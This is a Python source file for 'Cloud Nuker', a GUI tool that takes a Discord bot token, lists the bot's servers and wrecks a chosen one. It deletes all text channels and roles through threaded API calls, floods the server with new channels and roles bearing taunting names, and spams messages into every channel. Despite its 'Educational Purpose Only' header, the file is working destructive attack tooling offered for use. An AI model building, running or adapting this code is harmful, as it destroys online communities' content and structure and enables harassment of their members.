import tkinter as tk
import customtkinter as ctk
import threading
import time
import random
import bot_api
"""Actually im terrible in tkinter so
this code is a mess, but it works so...
https://github.com/Cloudzik1337

 * Educational Purpose Only
 * Author: [Cloudzik1337]
 * Date: [20.11.23]


Skids do your best to skid this code :* 
"""




version = "1.0.2"
class DiscordBotControlPanel(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.do = False
        # Configure window
        self.title("Discord Bot Control Panel")
        self.geometry("600x300")
        self.resizable(False, False)
        self.configure(bg="#2C2F33")
        self.attributes('-alpha', 0.9)
        self.guilds_frame = None
        # Configure grid layout
        self.grid_columnconfigure(1, weight=1)
        self.grid_columnconfigure((2, 3), weight=0)
        self.grid_rowconfigure((0, 1, 2), weight=0)
        
        
        # Create sidebar frame with widgets
        self.sidebar_frame = ctk.CTkFrame(self, width=140, corner_radius=0)
        self.sidebar_frame.grid(row=0, column=0, rowspan=4, sticky="nsew")
        self.sidebar_frame.grid_rowconfigure(4, weight=1)
        self.logo_label = ctk.CTkLabel(self.sidebar_frame, text=f"Cloud Nuker {version}", font=ctk.CTkFont(size=20, weight="bold"))
        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))
        # Nuke channels checkbox
        self.nuke_channels_var = tk.IntVar()
        self.nuke_channels_checkbox = ctk.CTkCheckBox(self.sidebar_frame, text="Nuke Channels", variable=self.nuke_channels_var)
        self.nuke_channels_checkbox.grid(row=1, column=0, padx=20, pady=5, sticky="w")
        # Nuke channels ammount slider
        # text upper slider
        self.nuke_channels_ammount_label = ctk.CTkLabel(self.sidebar_frame, text="Nuke Channels Ammount", font=ctk.CTkFont(size=12, weight="bold"))
        self.nuke_channels_ammount_label.grid(row=2, column=0, padx=20, pady=(5, 0), sticky="w")
        # slider
        self.nuke_channels_ammount = tk.IntVar()
        self.nuke_channels_slider = ctk.CTkSlider(self.sidebar_frame, variable=self.nuke_channels_ammount, from_=1, to=100, orientation=tk.HORIZONTAL)
        self.nuke_channels_slider.grid(row=3, column=0, padx=20, pady=1, sticky="ew")
        # Nuke roles checkbox
        self.nuke_roles_var = tk.IntVar()
        self.nuke_roles_checkbox = ctk.CTkCheckBox(self.sidebar_frame, text="Nuke Roles", variable=self.nuke_roles_var)
        self.nuke_roles_checkbox.grid(row=4, column=0, padx=20, pady=10, sticky="nw")
        # Nuke roles ammount slider label
        self.nuke_roles_ammount_label = ctk.CTkLabel(self.sidebar_frame, text="Nuke Roles Ammount", font=ctk.CTkFont(size=12, weight="bold"))
        self.nuke_roles_ammount_label.grid(row=5, column=0, padx=20, pady=(5, 0), sticky="nw")
        # Nuke roles ammount slider
        self.nuke_roles_ammount = tk.IntVar()
        self.nuke_roles_slider = ctk.CTkSlider(self.sidebar_frame, variable=self.nuke_roles_ammount, from_=1, to=100, orientation=tk.HORIZONTAL)
        self.nuke_roles_slider.grid(row=6, column=0, padx=20, pady=1, sticky="ew")
        #spam text
        self.spam_text_label = ctk.CTkLabel(self.sidebar_frame, text="Text To spam | <ammount> ", font=ctk.CTkFont(size=12, weight="bold"))
        self.spam_text_label.grid(row=7, column=0, padx=20, pady=(5, 0), sticky="nw")
        #spam text entry
        self.spam_text = tk.StringVar()
        self.spam_text_entry = ctk.CTkEntry(self.sidebar_frame, textvariable=self.spam_text)
        self.spam_text_entry.grid(row=8, column=0, padx=20, pady=1, sticky="ew")
        

        self.log_frame = ctk.CTkFrame(self, width=440, corner_radius=0)
        self.log_frame.grid(row=0, column=1, rowspan=4, sticky="nsew")
        # Configure row and column weights for log frame
        self.log_frame.grid_rowconfigure(1, weight=1)
        self.log_frame.grid_columnconfigure(0, weight=1)
        self.token_label = ctk.CTkLabel(self.log_frame, text="Token", font=ctk.CTkFont(size=12, weight="bold"))
        self.token_label.grid(row=6, column=0, padx=20, pady=(20, 0), sticky="sw")
        self.log_text = ctk.CTkTextbox(self.log_frame, width=500, height=15, corner_radius=0)
        self.log_text.configure(state="disabled")
        self.log_text.grid(row=1, column=0, padx=20, pady=10, sticky="nsew")
        # token entry
        self.Token = tk.StringVar()
        self.token_entry = ctk.CTkEntry(self.log_frame, textvariable=self.Token, width=170)
        self.token_entry.grid(row=7, column=0, padx=20, pady=(5, 0), sticky="s")
        # Start button
        self.start_button = ctk.CTkButton(self.log_frame, text="Start Bot", command=self.start_bot)
        self.start_button.grid(row=7, column=1, padx=5, pady=(5, 0), sticky="s")


  

        # Create main entry and button


    def start_bot(self):
  
        # print("Bot started with the following options:")
        # print(f"Token: {self.Token.get()}")
        # print(f"Nuke Channels: {self.nuke_channels_var.get()}")
        # print(f"Nuke Channels Ammount: {self.nuke_channels_ammount.get()}")
        # print(f"Nuke Roles: {self.nuke_roles_var.get()}")
        # print(f"Nuke Roles Ammount: {self.nuke_roles_ammount.get()}")
        # print(f"Spam Text: {self.spam_text.get()}")

        self.do = True

    def add_input_for_guild(self):
        #under log 
        self.guilds_frame = ctk.CTkFrame(self.log_frame, width=100, corner_radius=0)
        self.guilds_frame.grid(row=2, column=0, rowspan=4, sticky="nsew")
        # text upper entry
        self.guilds_label = ctk.CTkLabel(self.guilds_frame, text="Enter Guild Index", font=ctk.CTkFont(size=12, weight="bold"))
        self.guilds_label.grid(row=0, column=0, padx=20, pady=(20, 0), sticky="sw")
        # Configure row and column weights for log frame
        self.guilds_frame.grid_rowconfigure(1, weight=1)
        self.guilds_frame.grid_columnconfigure(0, weight=1)
        self.guilds_text = ctk.CTkEntry(self.guilds_frame, width=500, height=15, corner_radius=0)
        self.guilds_text.grid(row=1, column=0, padx=20, pady=10, sticky="nsew")

        

        
    
    def insert_log(self, log):
        self.log_text.configure(state="normal")  # Enable editing
        #insert as last line
        

        self.log_text.insert("end", log+"\n")
        #scroll to end
        self.log_text.see("end")
        self.log_text.configure(state="disabled")  # Disable editing
        self.log_frame.update()  #)
       


if __name__ == "__main__":
    app = DiscordBotControlPanel()
    Bot_login = False
    got = False
    name = [
"Nuked", 
"By Cloud",
"Cloud Owns you",
"Облако владеет вами",
"雲擁有您",
"Cloud The God",
"Cloud The King",
"No Mercy",
f"Cloud Nuker {version}"
]
    def rest():
        global got
        global Bot_login
        global name
        while True:
            
            if app.do:
                print("Bot started with the following options:")
                try:
                    api = bot_api.Bot(app.Token.get())
                    got = True
                except Exception as e:
                    app.insert_log(f"Error: {e}")
                    app.do = False
                else:
                    app.insert_log(f"Logged in as: {api.name}")
                    app.insert_log(f"ID: {api.id}")
                    guilds = api.get_guilds().json()
                    if not Bot_login:
                        
                        for guild in guilds:
                            app.insert_log(f"{guilds.index(guild)+1}. {guild['name']}")
                        app.add_input_for_guild()
                        Bot_login = True
                        got = False
                        
                #get user input
                if got:
                    which_guild = int(app.guilds_text.get())
                    guild = guilds[which_guild-1]
                    app.insert_log(f"Nuking guild: {guild['name']}")
                    if app.nuke_channels_var.get():
                        app.insert_log(f"Nuking channels...")
                        channels = api.find_text_channels(guild["id"])
                        for channel in channels:
                            thread = threading.Thread(target=api.delete_channel, args=(channel["id"],))
                            thread.daemon = True
                            thread.start()
                        for channel in channels:
                            app.insert_log(f"Nuked channel: {channel['name']}")
                            time.sleep(0.00001)
                        for _ in range(app.nuke_channels_ammount.get()):
                            
                            name_c = random.choice(name)
                            thread = threading.Thread(target=api.create_channel, args=(guild["id"], 0, name_c,))
                            thread.daemon = True
                            thread.start()
                        for _ in range(app.nuke_channels_ammount.get()):
                            name_c = random.choice(name)
                            app.insert_log(f"Created channel: {name_c}")
                            time.sleep(0.00001)
                    if app.spam_text.get() != "":
                        app.insert_log(f"Spamming channels...")
                        channels = api.find_text_channels(guild["id"])
                        for channel in channels:
                            try: text, amm = app.spam_text.get().split("|")
                            except: text, amm = app.spam_text.get(), 10
                            thread = threading.Thread(target=api.spam_channel, args=(channel["id"], text, int(amm),))
                            thread.daemon = True
                            thread.start()
                            time.sleep(0.0001)
                        for channel in channels:
                            app.insert_log(f"Spammed channel: {channel['name']}")
                            time.sleep(0.00001)
                    if app.nuke_roles_var.get():
                        app.insert_log(f"Nuking roles...")
                        roles = api.get_roles(guild["id"]).json()
                        for role in roles:
                            thread = threading.Thread(target=api.delete_role, args=(guild["id"], role["id"],))
                            thread.daemon = True
                            thread.start()
                        for role in roles:
                            app.insert_log(f"Nuked role: {role['name']}")
                            time.sleep(0.00001)
                        for _ in range(app.nuke_roles_ammount.get()):
                            name_c = random.choice(name)
                            thread = threading.Thread(target=api.create_role, args=(guild["id"], name_c,))
                            thread.daemon = True
                            thread.start()
                        for _ in range(app.nuke_roles_ammount.get()):
                            name_c = random.choice(name)
                            time.sleep(0.00001)
                        
                    

                        

               
                                


                    
                app.do = False
            time.sleep(0.1)
    
    thread = threading.Thread(target=rest)
    thread.daemon = True
    thread.start()
    app.mainloop()
